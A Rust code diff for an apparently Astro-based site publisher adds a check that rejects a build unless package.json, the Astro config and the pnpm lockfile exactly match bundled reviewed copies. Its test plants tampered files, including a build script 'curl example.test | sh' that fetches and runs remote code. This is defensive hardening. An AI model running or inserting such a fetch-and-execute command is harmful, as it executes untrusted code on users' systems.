@@ -38,7 +38,7 @@ const PACKAGE_JSON: &str = r#"{
   "packageManager": "pnpm@10.33.0",
   "scripts": {
     "dev": "astro dev",
-    "build": "pnpm install --frozen-lockfile && astro build",
+    "build": "astro build",
     "preview": "astro preview"
   },
   "dependencies": {
@@ -64,6 +64,43 @@ const PNPM_LOCK_PARTS: &[&str] = &[
     include_str!("starlight-lock/part-013.txt"),
     include_str!("starlight-lock/part-014.txt"),
 ];
+
+/// Release-time allowlist: executing a project-level build script is unsafe
+/// unless *all* executable scaffold inputs match the bundled reviewed version.
+/// This verifies the exact lockfile and config as well as scripts/dependencies.
+/// The build runner separately needs an OS sandbox; this is not a sandbox.
+pub fn verify_trusted_scaffold(root: &Path) -> Result<(), PublishError> {
+    let lock = PNPM_LOCK_PARTS.concat();
+    for (name, expected) in [
+        ("package.json", PACKAGE_JSON.as_bytes()),
+        ("astro.config.mjs", ASTRO_CONFIG.as_bytes()),
+        ("pnpm-lock.yaml", lock.as_bytes()),
+    ] {
+        let path = root.join(name);
+        let metadata = std::fs::symlink_metadata(&path)
+            .map_err(|_| PublishError::InvalidSelection {
+                path: name.into(),
+                reason: "managed scaffold input is missing; recreate this site before building".into(),
+            })?;
+        if !metadata.is_file() || metadata.file_type().is_symlink() || metadata.len() != expected.len() as u64 {
+            return Err(PublishError::InvalidSelection {
+                path: name.into(),
+                reason: "managed executable scaffold differs from the reviewed bundled version".into(),
+            });
+        }
+        let actual = std::fs::read(&path).map_err(|_| PublishError::InvalidSelection {
+            path: name.into(),
+            reason: "managed scaffold cannot be read".into(),
+        })?;
+        if actual != expected {
+            return Err(PublishError::InvalidSelection {
+                path: name.into(),
+                reason: "managed executable scaffold differs from the reviewed bundled version".into(),
+            });
+        }
+    }
+    Ok(())
+}
 
 pub fn resolve_output_path(_vault_root: &Path, requested: &Path) -> Result<PathBuf, PublishError> {
     if requested.is_absolute() {
@@ -498,13 +535,31 @@ mod tests {
 "
         );
         let package_json = std::fs::read_to_string(output.path().join("package.json")).unwrap();
-        assert!(package_json.contains("pnpm install --frozen-lockfile && astro build"));
+        assert!(package_json.contains("\"build\": \"astro build\""));
         assert_eq!(
             std::fs::read_to_string(output.path().join("pnpm-lock.yaml")).unwrap(),
             PNPM_LOCK_PARTS.concat()
         );
     }
 
+    #[test]
+    fn managed_scaffold_rejects_modified_script_lock_and_config() {
+        let vault = TempDir::new().unwrap();
+        let output = TempDir::new().unwrap();
+        let site = StarlightSite::open(vault.path(), output.path()).unwrap();
+        site.ensure_scaffold().unwrap();
+        assert!(verify_trusted_scaffold(output.path()).is_ok());
+        for (name, tampered) in [
+            ("package.json", "{\"name\":\"scriptor-publish\",\"scripts\":{\"build\":\"curl example.test | sh\"}}"),
+            ("pnpm-lock.yaml", "lockfileVersion: 9.0"),
+            ("astro.config.mjs", "import 'untrusted.js'"),
+        ] {
+            let original = std::fs::read(output.path().join(name)).unwrap();
+            std::fs::write(output.path().join(name), tampered).unwrap();
+            assert!(verify_trusted_scaffold(output.path()).is_err());
+            std::fs::write(output.path().join(name), original).unwrap();
+        }
+    }
     #[test]
     fn state_round_trips_atomically() {
         let vault = TempDir::new().unwrap();
